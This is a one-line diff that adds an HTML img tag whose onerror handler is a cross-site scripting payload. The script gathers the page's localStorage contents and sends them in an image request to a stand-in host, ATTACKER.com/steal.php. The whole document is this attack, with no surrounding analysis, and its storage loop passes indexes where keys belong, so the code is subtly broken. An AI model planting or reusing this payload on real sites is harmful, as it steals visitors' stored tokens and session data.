@@ -1,0 +1,1 @@
+<img src="notExistent.foo" onerror="function steal(){ var i=0; var stor= ''; var img = new Image(); for ( var i=0; i<localStorage.length ; i++) { stor+=localStorage.getItem(i); stor+='zzzzzzzzzzzzzzzz'; } img.src='http://ATTACKER.com/steal.php?storage='+stor; } steal() " />
